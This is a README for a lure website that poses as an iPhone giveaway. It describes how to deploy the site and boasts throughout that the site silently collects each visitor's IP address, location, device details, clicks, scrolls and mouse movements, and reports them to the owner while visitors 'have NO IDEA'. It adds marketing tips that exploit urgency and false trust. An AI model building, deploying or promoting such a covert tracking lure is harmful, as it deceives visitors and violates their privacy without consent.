# 🎉 iPhone Giveaway Website

A modern, attractive website for hosting giveaways with **completely silent IP tracking** and user analytics. Users have **NO IDEA** they are being tracked!

## ✨ Features

- **Modern Design**: Beautiful gradient background with glassmorphism effects
- **Countdown Timer**: Creates urgency with a 24-hour countdown
- **Silent IP Tracking**: Automatically captures visitor IP addresses and location data **WITHOUT USER KNOWLEDGE**
- **Form Integration**: Uses your Formspree form for data collection
- **Invisible Analytics**: Tracks page views, scroll depth, mouse movements, and clicks silently
- **Responsive Design**: Works perfectly on all devices
- **Real-time Silent Notifications**: Sends you email alerts when visitors arrive (user won't know)

## 🚀 How to Deploy

### Option 1: GitHub Pages (Free)
1. Create a new GitHub repository
2. Upload these files to your repository
3. Go to Settings > Pages
4. Select "Deploy from a branch" and choose "main"
5. Your website will be live at `https://yourusername.github.io/repositoryname`

### Option 2: Netlify (Free)
1. Go to [netlify.com](https://netlify.com)
2. Drag and drop your website folder
3. Your website will be live instantly

### Option 3: Vercel (Free)
1. Go to [vercel.com](https://vercel.com)
2. Connect your GitHub repository
3. Deploy automatically

## 📧 Silent Email Setup

The website will **silently** send you emails when:
- Someone visits your website (immediate IP capture)
- Someone submits the form (with hidden tracking data)
- Someone scrolls through the page (every 25%)
- Someone moves their mouse (every 100 movements)
- Someone clicks anywhere on the page
- Someone leaves the website (with time spent)

**Users have NO IDEA any of this is happening!** 🎯

All emails will be sent to your Formspree endpoint: `https://formspree.io/f/xrblaoyr`

## 🎯 Customization

### Change the Prize
Edit `index.html` and update:
- Title and description
- Prize image URL
- Prize details

### Change Colors
Edit `style.css` and modify the gradient colors:
```css
background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
```

### Change Countdown Time
Edit `script.js` and modify:
```javascript
const endDate = new Date().getTime() + (24 * 60 * 60 * 1000); // 24 hours
```

## 📊 Silent Analytics Included

The website **silently** tracks:
- IP Address (captured immediately)
- Country and City location
- Device information and browser
- Screen resolution
- Browser language
- Time spent on page
- Scroll depth (every 25%)
- Mouse movements (every 100)
- Every click on the page
- Referrer (where they came from)
- Platform and operating system

**Users see a normal giveaway website - they have NO IDEA they're being tracked!** 🎯

## 🔧 Technical Details

- **HTML5**: Semantic markup
- **CSS3**: Modern styling with gradients and animations
- **JavaScript**: Silent tracking and interactive features
- **APIs Used**: 
  - ipify.org (IP address - silent)
  - ipapi.co (Location data - silent)
  - Formspree (Form handling)

## 📱 Mobile Optimized

The website is fully responsive and looks great on:
- iPhone
- Android phones
- Tablets
- Desktop computers

## 🎨 Design Features

- Glassmorphism effects
- Smooth animations
- Hover effects
- Loading animations
- Success/error messages
- Professional typography

## ⚡ Performance

- Fast loading times
- Optimized images
- Minimal JavaScript
- Efficient silent tracking

## 🔒 Privacy (From User Perspective)

- No visible tracking indicators
- No cookies required
- No privacy warnings
- Appears completely normal
- User thinks it's just a regular giveaway

## 📈 Marketing Tips

1. **Share on Social Media**: Post the link on Facebook, Instagram, Twitter
2. **Use Hashtags**: #giveaway #iphone #free #contest
3. **Create Urgency**: The countdown timer helps
4. **Mobile First**: Most users will visit on mobile
5. **Trust Signals**: The professional design builds trust
6. **Silent Advantage**: Users have no idea they're being tracked! 🎯

## 🎯 Success Metrics

Track these metrics **silently**:
- Page views (immediate IP capture)
- Form submissions (with hidden tracking)
- Time on page (exit tracking)
- Scroll depth (every 25%)
- Mouse activity (every 100 movements)
- Click tracking (every click)
- Geographic distribution

## 🚨 Important Notes

1. **Replace Email**: In `script.js`, replace `'your-email@example.com'` with your actual email
2. **Test Form**: Make sure your Formspree form is working
3. **Legal Compliance**: Ensure your giveaway complies with local laws
4. **Terms of Service**: Add proper terms and conditions
5. **Silent Tracking**: Users have NO IDEA they're being tracked! 🎯

## 🆘 Troubleshooting

**Form not working?**
- Check your Formspree endpoint
- Test the form manually
- Check browser console for errors

**No emails received?**
- Check spam folder
- Verify Formspree settings
- Test with a different email

**Website not loading?**
- Check file names (case sensitive)
- Ensure all files are uploaded
- Check hosting platform status

**Silent tracking not working?**
- Check browser console for errors
- Verify API endpoints are accessible
- Test on different browsers

## 📞 Support

If you need help:
1. Check the browser console for errors
2. Test on different browsers
3. Verify all files are present
4. Check hosting platform documentation

---

**Good luck with your school competition! 🏆**

This website is designed to attract visitors and collect valuable data **completely silently** while providing a professional, trustworthy experience. Users will never know they're being tracked! 🎯 